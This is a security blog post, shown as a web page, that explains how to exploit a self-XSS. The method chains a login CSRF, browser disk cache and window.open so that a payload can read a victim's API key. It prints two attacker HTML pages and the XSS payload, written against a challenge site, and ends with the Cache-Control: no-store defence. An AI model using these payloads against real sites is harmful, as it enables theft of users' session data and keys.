@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html class=""
+id="theme-root" 
+lang="en-US" 
+dir="ltr">
+
+<head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+<meta name="theme-name" content="tailroad" />
+<title>Exploiting Self-XSS Using Disk Cache | blog</title>
+<meta name="description" content="">
+<link rel="shortcut icon" href="/favicon.ico">
+<script>
+  document.documentElement.classList.toggle(
+  "dark",
+  localStorage.theme === "dark" ||
+    (!("theme" in localStorage) && window.matchMedia("(prefers-color-scheme: dark)").matches),
+);
+</script><link rel="stylesheet" href="/css/main.26ffa0d33bc32cb240447910b7628fe31952afe8e8d20566d72eaafbc2f64308.css" integrity="sha256-Jv&#43;g0zvDLLJARHkQt2KP4xlSr&#43;jo0gVm1y6q&#43;8L2Qwg=" crossorigin="anonymous"></head>
+
+<body class="flex flex-col text-gray-900 dark:text-white bg-white dark:bg-gray-900"><header class="w-full sticky top-0 z-50 bg-gray-100 dark:bg-gray-800 border-b border-gray-200 dark:border-gray-700">
+  <div class="px-4 py-2 lg:px-6">
+    <div class="flex items-center justify-between ">      
+      <div class="flex items-center space-x-2">
+        <a href="/"  title="Meydi&#39;s Blog"  rel="home"
+          class="flex items-center">
+          
+          <img src="/images/logo.jpg" alt="Meydi&#39;s Blog" class="h-10 max-h-10 w-auto mr-2">
+          
+        </a>
+      </div>
+
+      <nav class="flex flex-wrap gap-4 text-sm">
+        
+<nav class="flex flex-wrap gap-4 text-sm">
+  
+    
+    
+    
+    
+
+    <a href="/"
+       class="flex items-center gap-2 px-4 py-2 rounded-md font-medium transition-colors duration-200
+              
+                text-gray-700 dark:text-gray-300 hover:bg-gray-200 dark:hover:bg-gray-800
+              ">
+      
+      <span>Home</span>
+    </a>
+  
+    
+    
+    
+    
+
+    <a href="/about/"
+       class="flex items-center gap-2 px-4 py-2 rounded-md font-medium transition-colors duration-200
+              
+                text-gray-700 dark:text-gray-300 hover:bg-gray-200 dark:hover:bg-gray-800
+              ">
+      
+      <span>About</span>
+    </a>
+  
+</nav>
+      </nav>
+
+      <div class="flex items-center space-x-4">  
+          <div class="flex items-center border border-gray-600 rounded-full px-4 py-2">
+        <i data-lucide="search" class="w-5 h-5 text-gray-400 mr-2"></i>
+        <input id="searchInput" type="text" placeholder="Search..." aria-label="Search Articles"
+          class="bg-transparent focus:outline-none text-sm text-gray-900 dark:text-white placeholder-gray-400" />                  
+        <kbd id="search-shortcut" class="ml-3 text-xs font-mono text-gray-500 dark:text-gray-300 bg-gray-200 dark:bg-gray-700 px-2 py-0.5 rounded">
+        
+      </kbd>
+      </div>
+          <button id="theme-toggle"
+            class="p-2 text-gray-500 hover:text-gray-700 dark:hover:text-gray-300 transition-colors duration-200 cursor-pointer"
+            aria-label="Toggle theme">
+            <i id="theme-icon-light" data-lucide="sun" class="w-5 h-5 block dark:hidden"></i>
+            <i id="theme-icon-dark" data-lucide="moon" class="w-5 h-5 hidden dark:block"></i>
+          </button>
+        </div>
+    </div>    
+  </div>
+</header><main id="main-content" class="w-full" role="main">
+    <div class="mx-auto max-w-5xl w-full py-6 px-4 sm:px-6 lg:px-8"><div class="grid grid-cols-1 lg:grid-cols-[1fr]"><section id="posts" class="space-y-2"><h1 class="text-3xl font-bold mb-2">Exploiting Self-XSS Using Disk Cache</h1>
+
+<div class="flex items-center gap-4 text-sm text-gray-500 dark:text-gray-400 mb-6">
+  <div class="flex items-center gap-1"><i class="fas fa-clock"></i>5 Mins read
+  </div>
+
+  <div class="flex items-center gap-1">
+      <i class="fas fa-calendar"></i>
+      <time datetime="2025-07-14T15:29:01&#43;01:00">July 14, 2025</time>
+    </div>
+  
+
+  <div class="flex items-center gap-1">
+  </div>
+</div><article class="prose dark:prose-invert max-w-none"><p><strong>Think about a situation where you have a self-XSS and you can&rsquo;t do anything with it — What would your next move be?</strong></p>
+<p>
+<a href="https://x.com/slonser_?s=21"
+   
+     target="_blank" rel="noopener noreferrer"
+   >
+   slonser
+</a> has a great 
+<a href="https://blog.slonser.info/posts/make-self-xss-great-again/"
+   
+     target="_blank" rel="noopener noreferrer"
+   >
+   write-up
+</a> that explains everything about exploiting self-XSS, so I won’t repeat those details here. But I’ll focus on one interesting technique.
+One of the ways to exploit a self-XSS is to force the victim to log in to <strong>your</strong> account, then run your self-XSS.<br>
+Maybe you think the only way to do this is through a login CSRF — and if that&rsquo;s the case, you&rsquo;re wrong.<br>
+There are several other ways to achieve this, like using <em>forgot password</em>, <em>magic link</em>, <em>user invite link</em>, etc.</p>
+<p>But let’s say you can <strong>actually do that</strong>.<br>
+Then you need a way to redirect the victim to the endpoint where the XSS exists.<br>
+And let’s say you can do that too.<br>
+In that situation, you&rsquo;re now in a <strong>new session</strong>, you might think that means you can’t access the victim’s data, If that were the case, it would&rsquo;ve been easy — but the one I actually exploited was a bit harder.</p>
+<p>I’ll explain a <strong>niche technique</strong> to exploit a type of self-XSS — where you can somehow log the victim into your account, but the XSS is on a different path, and you can’t redirect the victim to it directly.</p>
+<hr>
+<p>A few days ago, my friend <strong>
+<a href="https://x.com/0xsepix?s=21"
+   
+     target="_blank" rel="noopener noreferrer"
+   >
+   Sepehr
+</a></strong> reached out to me with a self-XSS. He also found a <strong>login CSRF</strong>.</p>
+<p>If the XSS runs exactly after login, the HTML below could bypass it and run the XSS — as one window (child) has the victim’s data, and we force the main window to send a form request to log the victim into the attacker’s account (where the XSS exists).<br>
+Since the windows are <strong>same-origin</strong> and have a <strong>parent/child</strong> relationship, they can read data from each other.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;attacker website&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;run()&#34;</span>&gt;click&lt;/<span style="color:#f92672">button</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;myForm&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://site.com/index.php&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;user&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pass&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">zwin</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;http://site.com/index.php&#34;</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;childWindow&#34;</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;width=600,height=400&#34;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>          document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;myForm&#34;</span>).<span style="color:#a6e22e">submit</span>();
+</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">3000</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>But it didn’t work in our situation.<br>
+Because after the login, it redirects to another path, and the XSS doesn’t fire.<br>
+So, how could we fire the XSS and still have access to the victim’s data (like <code>apikey</code>)?</p>
+<p>Another method that came to my mind was using <strong>iframe</strong>, but the response header had <code>X-Frame-Options: DENY</code>.</p>
+<hr>
+<p>I tried again, step by step:</p>
+<ul>
+<li>Open a new window and go to the path where the victim’s data exists</li>
+<li>Then send a POST CSRF login to that window using a form with the <code>target</code> attribute</li>
+<li>Then redirect that window to the XSS endpoint</li>
+</ul>
+<p>It&rsquo;s obvious that the XSS <strong>does fire</strong>, but we <strong>can’t access</strong> the victim’s data.</p>
+<p>I was imagining that window in my mind, and an idea popped up 😄
+<figure class=" ">
+  
+    <img src="/images/picx.png" alt="Alt text" class="">
+  
+
+  
+</figure>
+I remembered one of the best write-ups I’ve ever read: 
+<a href="https://jorianwoltjer.com/blog/p/research/nonce-csp-bypass-using-disk-cache"
+   
+     target="_blank" rel="noopener noreferrer"
+   >
+   nonce-csp-bypass-using-disk-cache
+</a>.
+It was amazing — definitely check it out.<br>
+
+<a href="https://x.com/j0r1an?s=21"
+   
+     target="_blank" rel="noopener noreferrer"
+   >
+   Jorian
+</a> explains <strong>disk cache</strong> completely, and it’s a very useful gadget.</p>
+<p>So I quickly tested it in the browser console:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">go</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>);
+</span></span></code></pre></div><p>&hellip;and saw the victim’s data 😁 hahaha!</p>
+<hr>
+<p>Then I made the HTML below ( slightly modified to work on 
+<a href="https://x.com/mehdiparandin/status/1943774358326985187"
+   
+     target="_blank" rel="noopener noreferrer"
+   >
+   this challenge
+</a>), which does the following:</p>
+<ul>
+<li>First, opens a new window where the victim’s data exists</li>
+<li>sends a CSRF login form</li>
+<li>navigates that window to the XSS payload endpoint</li>
+<li>Then redirects the <strong>parent window</strong> using <code>location.href</code> to that XSS endpoint again</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;run()&#34;</span>&gt;click&lt;/<span style="color:#f92672">button</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">form</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;myForm&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://selfkiri.x0x.site/login&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">target</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;childWindow&#34;</span>
+</span></span><span style="display:flex;"><span>    &gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;meydi&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;123&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">form</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">zwin</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;https://selfkiri.x0x.site/profile?victim&#34;</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;childWindow&#34;</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;width=600,height=400&#34;</span>
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>          document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;myForm&#34;</span>).<span style="color:#a6e22e">submit</span>();
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">zwin</span>.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://selfkiri.x0x.site/profile?attacker&#34;</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">setTimeout</span>(() =&gt; {
+</span></span><span style="display:flex;"><span>              window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://selfkiri.x0x.site/profile&#34;</span>;
+</span></span><span style="display:flex;"><span>            }, <span style="color:#ae81ff">2000</span>);
+</span></span><span style="display:flex;"><span>          }, <span style="color:#ae81ff">2000</span>);
+</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">2000</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>The XSS payload must be in:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;?attacker&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">?</span> <span style="color:#a6e22e">history</span>.<span style="color:#a6e22e">go</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">:</span> (<span style="color:#a6e22e">zwins</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;childWindow&#34;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">zwins</span>.document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;api-key&#34;</span>).<span style="color:#a6e22e">outerText</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">key</span>);
+</span></span></code></pre></div><p>Now we have <strong>two windows</strong> — they are same-origin and have a parent/child relationship, so they can read from each other.<br>
+Based on the <code>location.href</code> in the window, XSS payload decides to either <code>history.go(-2)</code> or read the data.</p>
+<p>One last trick is using a query parameter in the URL.
+That’s because the disk cache is based on the full URL — so by using different query parameters, we can keep <code>/profile?test</code> cached even when we later redirect the victim to the same endpoint <code>/profile</code>
+For example:</p>
+<p>/profile?attacker</p>
+<p>/profile?victim</p>
+<p>These are treated as different URLs and have separate cache keys</p>
+<p><strong>And DONE — we could exploit our self-XSS!</strong></p>
+<hr>
+<h3 id="-challenge">💥 Challenge</h3>
+<p>I made a challenge for this, and <strong>very few people</strong> solve it.
+sure it wasn’t seen by many, otherwise a lot of people would have solved it.</p>
+<p>firstblood🩸: 
+<a href="https://x.com/_0x999?s=21"
+   
+     target="_blank" rel="noopener noreferrer"
+   >
+   0x999
+</a></p>
+<p>You can check the source code and try it yourself.</p>
+<hr>
+<h3 id="when-it-doesnt-work">When It Doesn&rsquo;t Work</h3>
+<p>One of my friends 
+<a href="https://x.com/moeinerfanian?s=21"
+   
+     target="_blank" rel="noopener noreferrer"
+   >
+   Moein
+</a> solved the challenge and asked me: <em>&ldquo;When does this not work?&rdquo;</em><br>
+And he gave me this:</p>
+<pre tabindex="0"><code>Cache-Control: no-store, no-cache, must-revalidate
+</code></pre><p>After very little testing, I found that only:</p>
+<pre tabindex="0"><code>Cache-Control: no-store
+</code></pre><p>is enough to prevent such an attack — as explained in:<br>
+🔗 
+<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cache-Control"
+   
+     target="_blank" rel="noopener noreferrer"
+   >
+   https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cache-Control
+</a></p>
+<p>So if you&rsquo;re a developer, <strong>make sure to set this header on sensitive endpoints</strong>.</p>
+<p>If you want, test all the directives of <code>Cache-Control</code> yourself — because I didn’t test all of them, just the ones listed above.</p>
+<p>Thanks for reading! Have a nice day,</p>
+<p>
+<a href="https://x.com/mehdiparandin?s=21"
+   
+     target="_blank" rel="noopener noreferrer"
+   >
+   Meydi
+</a></p>
+</article>
+<br>
+<br></section></div>
+    </div> 
+</main>
+  <footer class="border-t border-gray-200 dark:border-gray-700"><div class="flex flex-row text-xs text-gray-500 dark:text-gray-400 items-center px-4 lg:px-6">
+  <div class="w-full">
+    &copy; 2025 meydee.xyz.  All rights reserved..
+    <span>Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank" class="hover:border-transparent hover:bg-purple-600 hover:text-white active:bg-purple-700">Hugo</a> and <a href="https://github.com/Sathishbs/Tailroad/" class="hover:border-transparent hover:bg-purple-600 hover:text-white active:bg-purple-700" rel="nofollow noopener" target="_blank">Tailroad</a> theme.</span>
+  </div>
+  <div class="flex space-x-2 ">
+    
+  </div>
+</div>
+</footer><button id="scrollTopBtn"
+        class="hidden fixed bottom-6 right-6 z-50 bg-gray-800 text-white px-4 py-2 rounded-full shadow-lg hover:bg-gray-700 transition duration-300"
+        aria-label="Scroll to top">
+  ^
+</button><script src="https://unpkg.com/lucide@latest"></script>
+<script>lucide.createIcons();</script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<script src="https://cdn.jsdelivr.net/npm/fuse.js/dist/fuse.min.js"></script>
+
+      <script src="/js/main.4bbde676f03a3208027a28f849d182967de5bfdd6b983f132c4cba39ee4678d0.js" integrity="sha256-S73mdvA6MggCeij4SdGCln3lv91rmD8TLEy6Oe5GeNA=" crossorigin="anonymous"></script>
+      <script src="/js/theme.53c91f6a0e91fe26ae654ca710fafd7af0f4fb9d8f5c8775242b41b966437ee3.js" integrity="sha256-U8kfag6R/iauZUynEPr9evD0&#43;52PXId1JCtBuWZDfuM=" crossorigin="anonymous"></script>
+      <script src="/js/toc.f0d11850d7f59e4c2f79d6672c961dae4b90ffff9b05f3ce338147675c43359c.js" integrity="sha256-8NEYUNf1nkwvedZnLJYdrkuQ//&#43;bBfPOM4FHZ1xDNZw=" crossorigin="anonymous"></script>
+      <script src="/js/code.6c32af83995789313f1c9a1ba72b554e3d2b56d2046d74b32d8eb32ddbc6b400.js" integrity="sha256-bDKvg5lXiTE/HJobpytVTj0rVtIEbXSzLY6zLdvGtAA=" crossorigin="anonymous"></script>
+      <script src="/js/search.db1ce50ecbf5ef971a3bfbde6ff7e11aa9ee16812aa4f047f371a1000b5dbfff.js" integrity="sha256-2xzlDsv175caO/veb/fhGqnuFoEqpPBH83GhAAtdv/8=" crossorigin="anonymous"></script></body>
+</html>
